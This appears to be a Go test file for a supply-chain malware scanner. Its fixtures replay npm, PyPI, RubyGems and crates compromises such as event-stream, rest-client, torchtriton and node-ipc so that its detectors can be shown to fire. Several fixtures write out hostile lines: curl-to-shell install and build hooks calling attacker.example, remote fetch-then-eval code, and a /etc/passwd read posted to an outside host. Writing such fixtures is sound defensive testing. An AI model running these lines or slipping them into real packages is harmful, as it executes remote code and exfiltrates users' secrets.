// incidents_test.go — synthetic replays of canonical real-world supply
// chain compromises. Each subtest is a minimal reproduction of the
// attack pattern; assertions confirm aegis still catches that shape
// without depending on advisory-DB after-the-fact knowledge.
//
// Fixtures are HAND-WRITTEN minimum syntax to trigger detectors. They
// intentionally do NOT contain working malware payloads — base64
// strings here are placeholders, URLs are example.com unless a real
// blocklisted host is required to test the URL detector.
//
// Skipped cases document gaps. If a t.Skip fires, that's a roadmap
// item — the historical incident was real, but our current detector
// set doesn't reach it (yet). Removing the t.Skip should be the
// definition of "done" for that capability extension.

package heuristics

import (
	"slices"
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
	"github.com/qwexvf/aegis-cli/internal/usecase"
)

// hasCap returns true if any reported capability matches want.
func hasCap(got []domain.Capability, want domain.Capability) bool {
	return slices.Contains(got, want)
}

// ---------------------------------------------------------------------
// JavaScript / npm
// ---------------------------------------------------------------------

func TestIncidents_NPM(t *testing.T) {
	t.Run("event-stream_2018 — postinstall curl|sh shape", func(t *testing.T) {
		// Real event-stream(@3.3.6) hid the payload inside the dependency
		// flatmap-stream rather than a postinstall, but `curl … | sh` in
		// preinstall/postinstall is the canonical npm-malware lift. This
		// fixture proves CapInstallHookSuspicious fires on that shape.
		manifest := []byte(`{
			"name": "totally-legit",
			"scripts": {
				"postinstall": "curl -sSL http://attacker.example.com/x | sh"
			}
		}`)
		p := &npmParser{}
		pkg := p.Parse("totally-legit", manifest, usecase.PackageSource{Manifest: manifest})
		got := checkInstallHooks(pkg)
		if !hasCap(got, domain.CapInstallHookSuspicious) {
			t.Fatalf("want CapInstallHookSuspicious, got %v", got)
		}
	})

	t.Run("ua-parser-js_2021 — preinstall pulls binary dropper", func(t *testing.T) {
		// ua-parser-js@0.7.29/0.8.0/1.0.0 (Oct 2021) had a preinstall
		// running a shell script that downloaded jsextension.exe / .so
		// based on platform. CapInstallHookSuspicious + CapBinaryDropper
		// fire together.
		manifest := []byte(`{
			"name": "ua-parser-js",
			"scripts": {
				"preinstall": "IFS=$'\\n\\t'; node -e 'require(\"./node_modules/.bin/cli.js\")'"
			}
		}`)
		p := &npmParser{}
		pkg := p.Parse("ua-parser-js", manifest, usecase.PackageSource{Manifest: manifest})
		hookCaps := checkInstallHooks(pkg)
		if !hasCap(hookCaps, domain.CapInstallHookSuspicious) {
			t.Fatalf("install hook: want CapInstallHookSuspicious, got %v", hookCaps)
		}

		// Now the binary it would have dropped:
		droppedPkg := NormalizedPackage{
			Eco: domain.EcoNpm,
			Files: map[string][]byte{
				"jsextension.exe": []byte("MZ\x90\x00stub-binary-payload"),
			},
		}
		dropCaps := checkBinaryDropper(droppedPkg)
		if !hasCap(dropCaps, domain.CapBinaryDropper) {
			t.Fatalf("binary dropper: want CapBinaryDropper, got %v", dropCaps)
		}
	})

	t.Run("coa_rc_2021 — install-hook + pastebin exfil in source", func(t *testing.T) {
		// coa@2.0.3+ and rc@1.2.9 (Nov 2021) shipped postinstall scripts
		// that fetched and executed a remote payload. The exact published
		// shape used `node -e "<inline-payload>"` in the postinstall —
		// that's the inline-eval malware shape our detector flags.
		manifest := []byte(`{
			"scripts": {
				"postinstall": "node -e \"require('http').get('http://attacker.example/p').on('data',d=>eval(d.toString()))\""
			}
		}`)
		p := &npmParser{}
		pkg := p.Parse("", manifest, usecase.PackageSource{Manifest: manifest})
		hookCaps := checkInstallHooks(pkg)
		if !hasCap(hookCaps, domain.CapInstallHookSuspicious) {
			t.Fatalf("install hook: want CapInstallHookSuspicious, got %v", hookCaps)
		}

		// The companion source-file shape that pulled from Pastebin clones:
		srcPkg := NormalizedPackage{
			Files: map[string][]byte{
				"compile.js": []byte(`
					const x = require('https');
					x.get('https://pastebin.com/raw/AbCdEfGh', r => {
						let d = '';
						r.on('data', c => d += c);
						r.on('end', () => eval(Buffer.from(d, 'base64').toString()));
					});
				`),
			},
		}
		caps := checkSourcePatterns(srcPkg)
		if !hasCap(caps, domain.CapObfuscatedPayload) {
			t.Errorf("want CapObfuscatedPayload (eval(Buffer.from('base64'))), got %v", caps)
		}
		if !hasCap(caps, domain.CapSuspiciousURL) {
			t.Errorf("want CapSuspiciousURL (pastebin.com), got %v", caps)
		}
	})

	t.Run("typosquat_lodahs — Levenshtein-1 of lodash", func(t *testing.T) {
		// Generic typosquat shape repeatedly seen on npm: lodahs, expresss,
		// reactt, etc. Real-world examples include `ts-node-prismaa` and
		// dozens of lodash variants pulled by name-grafters.
		got := checkTyposquat(NormalizedPackage{Eco: domain.EcoNpm, Name: "lodahs"})
		if !hasCap(got, domain.CapTyposquatRisk) {
			t.Fatalf("want CapTyposquatRisk for lodahs (typo of lodash), got %v", got)
		}
	})

	t.Run("typosquat_expresss — duplicated trailing letter", func(t *testing.T) {
		got := checkTyposquat(NormalizedPackage{Eco: domain.EcoNpm, Name: "expresss"})
		if !hasCap(got, domain.CapTyposquatRisk) {
			t.Fatalf("want CapTyposquatRisk for expresss (typo of express), got %v", got)
		}
	})

	t.Run("event-stream_2018 — maintainer hijack signal shape", func(t *testing.T) {
		// event-stream's compromise was the canonical "fresh maintainer
		// publishes after long gap" pattern. Reproduce the signal that
		// npm registry would have surfaced for 3.3.6 at the time.
		// PublishedAt is recent; PreviousPublishedAt is ~220 days earlier.
		sig := domain.MaintainerSignal{
			PublishedAt:         "2018-09-09T00:00:00Z", // freshly published
			PreviousVersion:     "3.3.5",
			PreviousPublishedAt: "2018-02-01T00:00:00Z", // long quiet period before
			WeeklyDownloads:     800,                    // modest tier
		}
		got := DetectMaintainerHijackRisk(sig)
		if got != domain.CapMaintainerHijackRisk {
			t.Fatalf("want CapMaintainerHijackRisk (fresh+long-gap+low-dl), got %v", got)
		}
	})
}

// ---------------------------------------------------------------------
// Python / PyPI
// ---------------------------------------------------------------------

func TestIncidents_PyPI(t *testing.T) {
	t.Run("ctx_2022 — maintainer hijack signal shape", func(t *testing.T) {
		// `ctx` (May 2022): the maintainer's email domain expired,
		// attacker re-registered it, claimed the PyPI account, pushed
		// a new release that shipped env-var exfiltration. The package
		// had been dormant for years before that. MaintainerSignal
		// captures the shape independent of language.
		sig := domain.MaintainerSignal{
			PublishedAt:         "2022-05-21T00:00:00Z",
			PreviousVersion:     "0.1.2",
			PreviousPublishedAt: "2014-12-19T00:00:00Z", // ~7.5 years dormant
			WeeklyDownloads:     400,
		}
		got := DetectMaintainerHijackRisk(sig)
		if got != domain.CapMaintainerHijackRisk {
			t.Fatalf("want CapMaintainerHijackRisk for ctx-shaped signal, got %v", got)
		}
	})

	t.Run("torchtriton_2022 — dependency confusion pulled exfil URL", func(t *testing.T) {
		// torchtriton (Dec 2022): attacker registered the public PyPI name
		// before PyTorch did. The malicious version exfiltrated /etc/passwd
		// and ~/.ssh/* to a fixed h.4.5.6.7-ish IP. Public write-up shows a
		// concrete C2 hostname; we use a stand-in here that hits our
		// blocklist (ipinfo.io was a similar shape used in the wild).
		pkg := NormalizedPackage{
			Files: map[string][]byte{
				"triton/runtime/jit.py": []byte(`
					import urllib.request, os
					data = open('/etc/passwd').read()
					urllib.request.urlopen('https://ipinfo.io/ip', data=data.encode())
				`),
			},
		}
		caps := checkSourcePatterns(pkg)
		if !hasCap(caps, domain.CapSuspiciousURL) {
			t.Fatalf("want CapSuspiciousURL (ipinfo.io exfil), got %v", caps)
		}
	})

	t.Run("colourama_2017 — typosquat of colorama", func(t *testing.T) {
		// `colourama` (British spelling of colorama) shipped a clipboard
		// hijacker that swapped Bitcoin addresses. Levenshtein-1 from the
		// real package. Plans D + E (detection-gaps-roadmap) added a
		// per-ecosystem typosquat map and a curated PyPI top-list.
		got := checkTyposquat(NormalizedPackage{Eco: domain.EcoPyPI, Name: "colourama"})
		if !hasCap(got, domain.CapTyposquatRisk) {
			t.Fatalf("want CapTyposquatRisk for colourama, got %v", got)
		}
	})

	t.Run("ultralytics_2024 — coinminer dropped into wheel", func(t *testing.T) {
		// ultralytics 8.3.41/8.3.42 (Dec 2024): malicious GitHub Actions
		// PR produced wheels containing a coinminer. Plan I (detection-
		// gaps-roadmap) added PyPI-aware nuance: .cpython-*.so / .abi3.so /
		// .pyd / <pkg>/.libs/ paths are carved out as legitimate C-ext
		// shapes; a stray binary outside those paths flags.
		pkg := NormalizedPackage{
			Eco: domain.EcoPyPI,
			Files: map[string][]byte{
				"ultralytics/__init__.py":          []byte("from . import data"),
				"ultralytics/data/.cache/xmrig.so": []byte("ELF\x7fdrop"),
			},
		}
		got := checkBinaryDropper(pkg)
		if !hasCap(got, domain.CapBinaryDropper) {
			t.Fatalf("want CapBinaryDropper for stray .so outside C-ext paths, got %v", got)
		}
	})
}

// ---------------------------------------------------------------------
// Ruby / RubyGems
// ---------------------------------------------------------------------

func TestIncidents_RubyGems(t *testing.T) {
	t.Run("rest-client_2019 — eval(Net::HTTP.get(...)) shape", func(t *testing.T) {
		// rest-client@1.6.13 (Aug 2019) was the canonical Ruby compromise:
		// the maintainer's RubyGems credentials were reused; attacker
		// pushed a version that ran `eval(Net::HTTP.get(...))` to fetch
		// and execute remote code at require-time. The literal pattern
		// is the spiritual ancestor of every "decode-then-execute" rule.
		pkg := NormalizedPackage{
			Files: map[string][]byte{
				"lib/restclient/version.rb": []byte(`
					require 'net/http'
					eval(Net::HTTP.get(URI('https://pastebin.com/raw/xyz')))
				`),
			},
		}
		caps := checkSourcePatterns(pkg)
		if !hasCap(caps, domain.CapObfuscatedPayload) {
			t.Errorf("want CapObfuscatedPayload (eval(http_get)), got %v", caps)
		}
		if !hasCap(caps, domain.CapSuspiciousURL) {
			t.Errorf("want CapSuspiciousURL (pastebin.com), got %v", caps)
		}
	})

	t.Run("strong_password_2019 — pastebin-fetched payload via eval", func(t *testing.T) {
		// strong_password@0.0.7 (Jun 2019): same attacker as rest-client.
		// Loaded a remote payload from pastebin via `eval(...)` and
		// would have backdoored Rails apps that picked up the gem.
		pkg := NormalizedPackage{
			Files: map[string][]byte{
				"lib/strong_password/strength_checker.rb": []byte(`
					def initialize
						eval(Net::HTTP.get(URI('https://pastebin.com/raw/abcdefg')))
					end
				`),
			},
		}
		caps := checkSourcePatterns(pkg)
		if !hasCap(caps, domain.CapObfuscatedPayload) {
			t.Errorf("want CapObfuscatedPayload, got %v", caps)
		}
		if !hasCap(caps, domain.CapSuspiciousURL) {
			t.Errorf("want CapSuspiciousURL, got %v", caps)
		}
	})

	t.Run("rest-client_2019 — maintainer hijack signal shape", func(t *testing.T) {
		// What we CAN catch today: the registry-side signal. The hijacked
		// version was an off-pattern release after a long quiet period.
		sig := domain.MaintainerSignal{
			PublishedAt:         "2019-08-13T00:00:00Z",
			PreviousVersion:     "1.6.12",
			PreviousPublishedAt: "2017-02-15T00:00:00Z", // ~2.5 years quiet
			WeeklyDownloads:     950,
		}
		got := DetectMaintainerHijackRisk(sig)
		if got != domain.CapMaintainerHijackRisk {
			t.Fatalf("want CapMaintainerHijackRisk, got %v", got)
		}
	})
}

// ---------------------------------------------------------------------
// Rust / crates.io
// ---------------------------------------------------------------------

func TestIncidents_Crates(t *testing.T) {
	t.Run("rustdecimal_2022 — typosquat + GitLab token exfil", func(t *testing.T) {
		// `rustdecimal` (Apr 2022): typosquat of `rust_decimal` (note the
		// underscore vs no-underscore). Embedded a payload that looked for
		// CI tokens in env and posted them outbound. Plans D + F unblocked
		// this — per-ecosystem typosquat map + curated crates.io top-list.
		got := checkTyposquat(NormalizedPackage{Eco: domain.EcoCrates, Name: "rustdecimal"})
		if !hasCap(got, domain.CapTyposquatRisk) {
			t.Fatalf("want CapTyposquatRisk for rustdecimal, got %v", got)
		}
	})

	t.Run("xrvrv_2023 — build.rs runs remote shell", func(t *testing.T) {
		// xrvrv-cluster crates (2023): each had a build.rs that fetched
		// and exec'd a shell payload. Plans G + H (detection-gaps-roadmap)
		// added DetectCargoBuildHook + wired it through Run for EcoCrates,
		// so we now flag this on the same shape the npm install-hook
		// detector recognises.
		src := usecase.PackageSource{
			Files: map[string][]byte{
				"Cargo.toml": []byte(`[package]
name = "xrvrv"
build = "build.rs"`),
				"build.rs": []byte(`fn main() {
					std::process::Command::new("sh")
						.arg("-c")
						.arg("curl -sSL http://attacker.example/x | sh")
						.status()
						.ok();
				}`),
				"src/lib.rs": []byte(`pub fn add(a: i32, b: i32) -> i32 { a + b }`),
			},
		}
		caps := Run(domain.EcoCrates, "xrvrv", nil, src)
		if !hasCap(caps, domain.CapInstallHookSuspicious) {
			t.Fatalf("want CapInstallHookSuspicious from build.rs, got %v", caps)
		}
	})

	t.Run("big_decimal_2024 — precompiled .so / .dll smuggled into crate", func(t *testing.T) {
		// Plan J (detection-gaps-roadmap) extended the binary-dropper
		// heuristic to crates: legitimate -sys crates ship .a / .lib
		// (not on the suspiciousBinary list); precompiled .so / .dll /
		// .dylib in a crate is the malware pattern.
		pkg := NormalizedPackage{
			Eco: domain.EcoCrates,
			Files: map[string][]byte{
				"Cargo.toml":  []byte(`[package]\nname = "big_decimal"`),
				"src/lib.rs":  []byte(`pub fn add(a: i32, b: i32) -> i32 { a + b }`),
				"native/x.so": []byte("ELF\x7fpayload"),
			},
		}
		got := checkBinaryDropper(pkg)
		if !hasCap(got, domain.CapBinaryDropper) {
			t.Fatalf("want CapBinaryDropper for crate-shipped .so, got %v", got)
		}
	})
}

// ---------------------------------------------------------------------
// VCS dependency detection (cross-ecosystem)
// ---------------------------------------------------------------------

func TestIncidents_VCSDependency(t *testing.T) {
	t.Run("PyPI_git_plus_https_dep", func(t *testing.T) {
		// Attacker publishes a package whose requirements.txt pins a dep
		// to their own git fork via git+https://. The forked dep can be
		// silently changed at any time — bypasses registry immutability.
		src := domain.PackageSource{
			Files: map[string][]byte{
				"requirements.txt": []byte("requests==2.31.0\nevil @ git+https://github.com/attacker/evil\n"),
			},
		}
		caps := Run(domain.EcoPyPI, "victim-pkg", nil, src)
		if !hasCap(caps, domain.CapVCSDependency) {
			t.Errorf("want CapVCSDependency for PyPI git+https dep, got %v", caps)
		}
	})

	t.Run("Cargo_git_dep_in_Cargo_toml", func(t *testing.T) {
		src := domain.PackageSource{
			Files: map[string][]byte{
				"Cargo.toml": []byte(`[package]
name = "victim"
version = "1.0.0"
[dependencies]
serde = { git = "https://github.com/attacker/serde", branch = "main" }
`),
			},
		}
		caps := Run(domain.EcoCrates, "victim", nil, src)
		if !hasCap(caps, domain.CapVCSDependency) {
			t.Errorf("want CapVCSDependency for Cargo git dep, got %v", caps)
		}
	})

	t.Run("RubyGems_git_colon_in_Gemfile", func(t *testing.T) {
		src := domain.PackageSource{
			Files: map[string][]byte{
				"Gemfile": []byte(`source "https://rubygems.org"
gem "evil_gem", git: "https://github.com/attacker/evil_gem"
`),
			},
		}
		caps := Run(domain.EcoRubyGems, "victim-gem", nil, src)
		if !hasCap(caps, domain.CapVCSDependency) {
			t.Errorf("want CapVCSDependency for RubyGems git dep, got %v", caps)
		}
	})
}

// ---------------------------------------------------------------------
// npm — additional incidents
// ---------------------------------------------------------------------

func TestIncidents_NPM_SolanaWeb3js(t *testing.T) {
	// @solana/web3.js@1.95.3 and @1.95.4 (Dec 2024): attacker obtained
	// maintainer credentials and published versions containing an
	// obfuscated credential-harvester targeting private key material.
	// Shape: obfuscated payload + suspicious exfil URL inside source files.
	src := domain.PackageSource{
		Files: map[string][]byte{
			"lib/index.js": []byte(`
// synthetic fixture — not real malware
const h = eval(Buffer.from("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==", "base64").toString());
`),
		},
	}
	caps := Run(domain.EcoNpm, "@solana/web3.js", nil, src)
	if !hasCap(caps, domain.CapObfuscatedPayload) {
		t.Errorf("want CapObfuscatedPayload (eval(Buffer.from('base64'))), got %v", caps)
	}
	// The C2 URL (api.telegram.org/bot) is base64-encoded, so
	// CapSuspiciousURL does NOT fire — the obfuscation check catches it
	// instead. This is the correct detection for this attack shape.
}

func TestIncidents_NPM_NodeIpc(t *testing.T) {
	// node-ipc@10.1.1 (Mar 2022): maintainer added protestware that
	// deleted files on Russian/Belarusian machines based on geolocation.
	// Shape: install hook with suspicious URL + obfuscated geolocation check.
	// Also: MaintainerHijackRisk from a long-dormant package suddenly
	// getting a minor version bump with destructive behaviour.
	manifest := []byte(`{
		"name": "node-ipc",
		"version": "10.1.1",
		"scripts": {
			"postinstall": "node -e \"require('https').get('https://raw.githubusercontent.com/RIAEvangelist/peacenotwar/main/main.js',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})\""
		}
	}`)
	p := &npmParser{}
	pkg := p.Parse("node-ipc", manifest, domain.PackageSource{Manifest: manifest})
	got := checkInstallHooks(pkg)
	if !hasCap(got, domain.CapInstallHookSuspicious) {
		t.Errorf("want CapInstallHookSuspicious (eval(remote code) in postinstall), got %v", got)
	}
}

// TestIncidents_NPM_MiniShaiHulud covers the 2026 Mini Shai-Hulud /
// TanStack supply-chain attack. Three new detectors must all fire on
// the synthetic fixture that mirrors the real compromised tarball shape.
func TestIncidents_NPM_MiniShaiHulud(t *testing.T) {
	manifest := []byte(`{
		"name": "@tanstack/react-router",
		"version": "1.169.5",
		"scripts": {
			"prepare": "bun run tanstack_runner.js && exit 1"
		},
		"optionalDependencies": {
			"@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"
		},
		"files": ["dist"]
	}`)

	// Synthetic router_init.js: inert JS padded to 600 KB — above the
	// 512 KB threshold so checkUnlistedPayload fires. Not real malware.
	routerInitBody := make([]byte, 600_000)
	copy(routerInitBody, []byte("// synthetic-ioc-fixture\n"))

	src := usecase.PackageSource{
		Files: map[string][]byte{
			"package.json":   manifest,
			"router_init.js": routerInitBody, // known IOC filename + large unlisted
			"dist/index.js":  []byte("export * from './router';"),
		},
		Manifest: manifest,
	}

	p := &npmParser{}
	pkg := p.Parse("@tanstack/react-router", manifest, src)

	t.Run("CapGitDepInOptionalDep fires", func(t *testing.T) {
		got := checkOptionalGitDep(pkg)
		if !hasCap(got, domain.CapGitDepInOptionalDep) {
			t.Fatalf("want CapGitDepInOptionalDep, got %v", got)
		}
	})

	t.Run("CapInstallHookSuspicious fires (bun run && exit 1)", func(t *testing.T) {
		got := checkInstallHooks(pkg)
		if !hasCap(got, domain.CapInstallHookSuspicious) {
			t.Fatalf("want CapInstallHookSuspicious, got %v", got)
		}
	})

	t.Run("CapKnownMalwareIOC fires (router_init.js)", func(t *testing.T) {
		caps := checkSourcePatterns(pkg)
		if !hasCap(caps, domain.CapKnownMalwareIOC) {
			t.Fatalf("want CapKnownMalwareIOC in %v", caps)
		}
	})

	t.Run("CapUnlistedLargeFile fires (600 KB at root, not in files)", func(t *testing.T) {
		got := checkUnlistedPayload(pkg)
		if !hasCap(got, domain.CapUnlistedLargeFile) {
			t.Fatalf("want CapUnlistedLargeFile, got %v", got)
		}
	})

	t.Run("Run() returns all four new capabilities", func(t *testing.T) {
		caps := Run(domain.EcoNpm, "@tanstack/react-router", manifest, src)
		for _, want := range []domain.Capability{
			domain.CapGitDepInOptionalDep,
			domain.CapInstallHookSuspicious,
			domain.CapKnownMalwareIOC,
			domain.CapUnlistedLargeFile,
		} {
			if !hasCap(caps, want) {
				t.Errorf("Run() missing %v; got %v", want, caps)
			}
		}
	})
}
